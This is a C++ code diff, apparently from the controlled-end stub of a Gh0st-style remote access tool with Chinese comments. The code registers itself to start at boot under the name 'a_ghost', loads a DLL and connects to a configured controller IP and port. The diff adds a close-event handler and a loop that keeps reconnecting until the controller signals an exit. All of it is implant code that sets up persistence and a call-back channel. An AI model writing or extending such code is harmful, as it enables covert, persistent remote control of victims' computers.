@@ -12,6 +12,11 @@ StopRun stop = NULL;
 // 是否成功停止
 IsStoped bStop = NULL;
 
+// 是否退出被控端
+IsStoped bExit = NULL;
+
+BOOL status = 0;
+
 struct CONNECT_ADDRESS
 {
 	DWORD dwFlag;
@@ -50,12 +55,26 @@ BOOL SetSelfStart(const char *sPath, const char *sNmae)
 	return lRet == ERROR_SUCCESS;
 }
 
+BOOL CALLBACK callback(DWORD CtrlType)
+{
+	if (CtrlType == CTRL_CLOSE_EVENT)
+	{
+		status = 1;
+		if(stop) stop();
+		while(1==status)
+			Sleep(20);
+	}
+	return TRUE;
+}
+
 int main(int argc, const char *argv[])
 {
 	if(!SetSelfStart(argv[0], "a_ghost"))
 	{
 		std::cout<<"设置开机自启动失败.\n";
 	}
+	status = 0;
+	SetConsoleCtrlHandler(&callback, TRUE);
 	char path[_MAX_PATH], *p = path;
 	GetModuleFileNameA(NULL, path, sizeof(path));
 	while (*p) ++p;
@@ -66,6 +85,7 @@ int main(int argc, const char *argv[])
 	TestRun run = hDll ? TestRun(GetProcAddress(hDll, "TestRun")) : NULL;
 	stop = hDll ? StopRun(GetProcAddress(hDll, "StopRun")) : NULL;
 	bStop = hDll ? IsStoped(GetProcAddress(hDll, "IsStoped")) : NULL;
+	bExit = hDll ? IsStoped(GetProcAddress(hDll, "IsExit")) : NULL;
 	if (run)
 	{
 		char *ip = g_ConnectAddress.szServerIP;
@@ -77,12 +97,13 @@ int main(int argc, const char *argv[])
 			port = GetPrivateProfileIntA("remote", "port", 2356, path);
 		}
 		printf("[remote] %s:%d\n", ip, port);
-		run(ip, port);
-#ifdef _DEBUG
-		while(1){ char ch[64]; std::cin>>ch; if (ch[0]=='q'){ break; } }
-		if (stop) stop();
-		while(bStop && !bStop()) Sleep(200);
-#endif
+		do 
+		{
+			run(ip, port);
+			while(bStop && !bStop() && 0 == status)
+				Sleep(20);
+		} while (bExit && !bExit() && 0 == status);
 	}
+	status = 0;
 	return -1;
 }
